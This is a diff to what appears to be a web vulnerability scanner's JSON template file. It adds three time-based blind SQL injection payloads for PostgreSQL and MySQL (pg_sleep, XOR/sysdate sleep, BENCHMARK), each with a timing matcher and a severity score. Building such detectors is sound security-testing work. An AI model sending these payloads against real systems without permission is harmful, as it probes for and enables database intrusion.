@@ -137,6 +137,45 @@
           "severity": "high",
           "confidence_boost": 45,
           "variables": {}
+        },
+        {
+          "payload": "{{baseline}}';SELECT pg_sleep(5)-- -",
+          "description": "PostgreSQL stacked time-blind pg_sleep(5)",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z",
+          "description": "MySQL XOR/sysdate time-blind \u2014 survives both quoted and numeric contexts",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 5000=BENCHMARK(5000000,MD5(0x41))",
+          "description": "MySQL BENCHMARK CPU-time blind when SLEEP is filtered",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4500
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
         }
       ]
     },
